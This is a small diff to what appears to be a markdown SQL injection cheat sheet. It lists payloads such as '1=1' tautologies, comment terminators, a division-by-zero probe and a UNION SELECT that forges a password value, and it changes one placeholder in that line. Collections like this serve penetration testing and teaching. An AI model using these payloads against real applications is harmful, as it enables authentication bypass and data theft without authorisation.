@@ -45,7 +45,7 @@ xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
 1' or 1=1-- -%00
 ' or '1'='1
 '; --
-' union select "pass" as password from <table_name> where '1'='1
+' union select "pass" as password from <db_name> where '1'='1
 ```
 ### Parameter Testing For Time Based Blind
 ```sql
